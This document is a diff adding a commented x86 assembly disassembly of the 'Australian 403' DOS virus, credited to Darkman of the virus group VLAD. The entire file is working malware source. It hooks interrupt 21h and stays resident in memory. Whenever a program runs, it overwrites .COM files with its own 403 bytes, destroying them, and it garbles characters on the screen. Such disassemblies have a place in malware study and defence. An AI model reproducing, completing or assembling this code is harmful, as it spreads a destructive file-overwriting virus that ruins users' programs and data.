@@ -1,0 +1,167 @@
+
+;                             Darkman/VLAD
+;                           Proudly Presents
+;                    Disassembly of Australian 403
+
+
+aussie403    segment
+             assume  cs:aussie403,ds:aussie403,es:aussie403
+             org     100h                ; Origin of COM-file
+
+code:
+             jmp     resident
+stackptr     dw      ?                   ; Stack pointer
+stackseg     dw      ?                   ; Stack segment
+accumulator  dw      ?                   ; Accumulator register
+message      db      00h,0dh,0ah         
+             db      'ScUD 1991!'        ; Message by the author
+             db      0dh,0ah
+stackbytes   db      41h dup(?)          ; Stack
+int21off     dw      ?                   ; Offset of interrupt 21h
+int21seg     dw      ?                   ; Segment of interrupt 21h
+filespec     db      '*.COM',00h         ; File specification
+filehandle   dw      ?                   ; File handle
+
+dta:                                     ; Disk transfer area (DTA)
+drive        db      ?                   ; Drive letter
+searchtemp   db      0bh dup(?)          ; Search template
+reserved     db      09h dup (?)         ; Reserved
+fileattr     dw      ?                   ; File attribute
+filetime     db      ?                   ; File time
+filedate     dw      ?                   ; File date
+filesize     dd      ?                   ; Filesize
+filename     db      0dh dup (?)         ; Filename + extension
+
+fill         db      04h dup (?)         ; Fill of virus
+
+virusint21   proc    near                ; Interrupt 21h of Australian 403
+             mov     cs:stackptr,sp      ; Save stack pointer
+             mov     cs:stackseg,ss      ; Save stack segment
+             mov     cs:accumulator,ax   ; Save accumulator register
+             lea     sp,message          ; SP = offset of message
+             nop
+             add     sp,4eh
+
+             mov     ax,cs
+             mov     ss,ax
+             mov     ax,cs:accumulator   ; Load accumulator register
+             cmp     ah,4bh              ; Load or execute a program?
+             je      service4b           ; Equal? Jump to service4b
+             jmp     virusexit
+service4b:
+             push    ax                  ; Save AX at stack
+             push    bx                  ; Save BX at stack
+             push    cx                  ; Save CX at stack
+             push    dx                  ; Save DX at stack
+             push    ds                  ; Save DS at stack
+             push    es                  ; Save ES at stack
+             push    si                  ; Save SI at stack
+             push    di                  ; Save DI at stack
+
+             mov     ax,0b800h
+             mov     ds,ax               ; DS = text color screen segment
+             mov     bx,00h
+chkscreen:
+             mov     al,[bx]             ; Read from screen
+             cmp     al,'0'              ; Zero?
+             jne     fuckscreen          ; Not equal? Jump to fuckscreen
+             mov     al,'O'              ; Convert zeros to O's
+fuckscreen:
+             mov     [bx],al             ; Write to screen
+             inc     bx                  ; Increase BX
+             inc     bx                  ; Increase BX
+             cmp     bx,1000h            ; End of screen?
+             jne     chkscreen           ; Not equal? Jump to chkscreen
+
+             mov     ax,cs
+             mov     ds,ax
+             lea     dx,dta              ; DX = offset of dta
+             mov     ah,1ah              ; Set disk transfer area
+             pushf                       ; Save flags at stack
+             call    dword ptr cs:int21off
+
+             mov     ax,cs
+             mov     ds,ax
+             lea     dx,filespec         ; DX = offset of filespec
+             mov     cx,00h              ; Set file attribute
+             mov     ah,4eh              ; Find first matching file
+             pushf                       ; Save flags at stack
+             call    dword ptr cs:int21off
+             jc      infectexit          ; Error? Jump to infectexit
+
+             cmp     word ptr [offset filesize],0193h
+             jne     infect              ; Not infected? Jump to infect
+findnext:
+             mov     ah,4fh              ; Find next matching file
+             pushf                       ; Save flags at stack
+             call    dword ptr cs:int21off
+             jc      infectexit          ; Error? Jump to infectexit
+
+             cmp     word ptr [offset filesize],0193h
+             jne     infect              ; Not infected? Jump to infect
+             jmp     short findnext
+infect:
+             mov     ax,cs
+             mov     ds,ax
+             lea     dx,filename         ; DX = offset of filename
+             mov     ah,3ch              ; Create a file
+             mov     cx,00h              ; Set file attribute
+             pushf                       ; Save flags at stack
+             call    dword ptr cs:int21off
+             mov     filehandle,ax       ; Save file handle
+
+             mov     ax,cs
+             mov     ds,ax
+             mov     bx,filehandle       ; Load file handle
+             mov     cx,(codeend-code)   ; Write 403 bytes
+             lea     dx,code             ; DX = offset of code
+             mov     ah,40h              ; Write to file
+             pushf                       ; Save flags at stack
+             call    dword ptr cs:int21off
+
+             mov     bx,filehandle       ; Load file handle
+             mov     ah,3eh              ; Close file
+             pushf                       ; Save flags at stack
+             call    dword ptr cs:int21off
+infectexit:
+             pop     di                  ; Load DI from stack
+             pop     si                  ; Load SI from stack
+             pop     es                  ; Load ES from stack
+             pop     ds                  ; Load DS from stack
+             pop     dx                  ; Load DX from stack
+             pop     cx                  ; Load CX from stack
+             pop     bx                  ; Load BX from stack
+             pop     ax                  ; Load AX from stack
+virusexit:
+             mov     sp,cs:stackptr      ; Load stack pointer
+             mov     ax,cs:stackseg
+             mov     ss,ax               ; Load stack segment
+             mov     ax,cs:accumulator   ; Load accumulator register
+             jmp     dword ptr cs:int21off
+             endp
+
+resident:
+             mov     ax,cs
+             mov     ds,ax
+             mov     es,ax
+             mov     ss,ax
+
+             mov     ax,3521h            ; Get address of interrupt 21h
+             int     21h                 ; Do it!
+             mov     int21off,bx         ; Save offset of interrupt 21h
+             mov     int21seg,es         ; Save segment of interrupt 21h
+
+             mov     ax,cs
+             mov     ds,ax
+             mov     ax,2521h            ; Set address of interrupt 21h
+             lea     dx,virusint21       ; DX = offset of virusint21
+             int     21h                 ; Do it!
+
+             mov     dx,293h             ; Reserve 672 bytes of memory
+             int     27h                 ; Terminate but stay resident
+codeend:
+
+aussie403    ends
+end          code
+
+
